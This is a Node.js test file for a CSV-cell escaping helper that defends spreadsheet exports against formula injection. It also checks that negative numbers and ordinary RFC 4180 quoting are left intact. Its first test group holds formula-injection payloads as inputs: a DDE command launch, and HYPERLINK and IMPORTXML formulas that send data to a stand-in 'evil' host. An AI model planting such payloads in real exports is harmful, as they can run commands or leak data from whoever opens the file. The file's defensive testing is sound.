// api/_lib/csv-cell.test.js
// Run: node --test api/_lib/csv-cell.test.js
//
// The arms are grouped by the question they answer, because two of the groups
// pull in opposite directions and that tension IS the design: a payload must be
// neutralised, and a negative number must not be.

const { test } = require('node:test');
const assert = require('node:assert');
const { csvCell, csvRow, looksNumeric } = require('./csv-cell.js');

// ── 1. THE PAYLOADS ────────────────────────────────────────────────────────
test('a leading = is neutralised -- the DDE launch, not a calculation', () => {
  assert.strictEqual(csvCell("=cmd|'/c calc'!A0"), '"\'=cmd|\'/c calc\'!A0"');
});

test('the exfiltration shapes are neutralised too', () => {
  assert.ok(csvCell('=HYPERLINK("http://evil","click")').startsWith('"\'='));
  assert.ok(csvCell('=IMPORTXML("http://evil/"&A1,"//a")').startsWith('"\'='));
  assert.ok(csvCell('@SUM(A1:A9)').startsWith('"\'@'));
  assert.ok(csvCell('+1+1'), '+1+1 must be considered');
  assert.strictEqual(csvCell('-1+1'), '"\'-1+1"');
});

test('a LEADING WHITESPACE payload does not get past the guard', () => {
  // This is why tab and CR are in the dangerous set: a filter looking only at
  // s[0] === '=' is defeated by one tab.
  assert.strictEqual(csvCell('\t=cmd|x'), '"\'\t=cmd|x"');
  assert.strictEqual(csvCell('\r=cmd|x'), '"\'\r=cmd|x"');
});

// ── 2. THE NUMBERS, WHICH MUST SURVIVE UNTOUCHED ──────────────────────────
// A security fix that turns a credit into text is a financial reporting error.
test('a negative amount stays a NUMBER -- no apostrophe', () => {
  assert.strictEqual(csvCell('-50.00'), '"-50.00"');
  assert.strictEqual(csvCell(-50.5), '"-50.5"');
  assert.strictEqual(csvCell('+1e5'), '"+1e5"');
  assert.strictEqual(csvCell('-0'), '"-0"');
});

test('...and a tab-padded number is still a number', () => {
  assert.strictEqual(csvCell('\t5'), '"\t5"');
});

test('CONTROL: the guarded and unguarded cases really do differ', () => {
  // Without this, every arm above could pass on a function that guards
  // everything or nothing -- the two groups would each be satisfied by one of
  // those and only the pair rules both out.
  assert.notStrictEqual(csvCell('-50.00'), csvCell('-1+1'));
  assert.ok(!csvCell('-50.00').includes("'"), 'a number must not be quoted as text');
  assert.ok(csvCell('-1+1').includes("'"), 'an expression must be');
});

// ── 3. RFC 4180 STILL WORKS -- the guard must not have broken quoting ─────
test('embedded quotes are still doubled', () => {
  assert.strictEqual(csvCell('say "hi"'), '"say ""hi"""');
});

test('commas and newlines are still contained', () => {
  assert.strictEqual(csvCell('a,b'), '"a,b"');
  assert.strictEqual(csvCell('a\nb'), '"a\nb"');
});

test('a payload that ALSO contains a quote gets both treatments', () => {
  // The apostrophe goes INSIDE the quotes and the inner quote is still
  // doubled. Getting the order wrong here produces a file that either does not
  // parse or is not guarded.
  assert.strictEqual(csvCell('=A1&"x"'), '"\'=A1&""x"""');
});

// ── 4. THE BORING INPUTS, because a helper on every export path meets them ─
test('null, undefined and empty are an empty quoted cell', () => {
  assert.strictEqual(csvCell(null), '""');
  assert.strictEqual(csvCell(undefined), '""');
  assert.strictEqual(csvCell(''), '""');
});

test('ordinary text is untouched apart from the quotes', () => {
  assert.strictEqual(csvCell('Jane Smith'), '"Jane Smith"');
  assert.strictEqual(csvCell(0), '"0"');
  assert.strictEqual(csvCell(false), '"false"');
});

test('EVERY cell is quoted, including ones that need no quoting', () => {
  // The conditional form is what let a bare `=cmd|...` out of
  // roofing-gl-export.js. Asserted so nobody re-introduces it as an
  // optimisation.
  assert.strictEqual(csvCell('plain'), '"plain"');
});

// ── 5. looksNumeric, exported and therefore callable ──────────────────────
test('looksNumeric does not call the empty string a number', () => {
  assert.strictEqual(looksNumeric(''), false);
  assert.strictEqual(looksNumeric('0'), true);
  assert.strictEqual(looksNumeric('NaN'), false);
  assert.strictEqual(looksNumeric('Infinity'), false);
});

// ── 6. csvRow ─────────────────────────────────────────────────────────────
test('csvRow joins escaped cells and guards each one', () => {
  assert.strictEqual(csvRow(['a', '=b', -5]), '"a","\'=b","-5"');
  assert.strictEqual(csvRow([]), '');
  assert.strictEqual(csvRow(null), '');
});
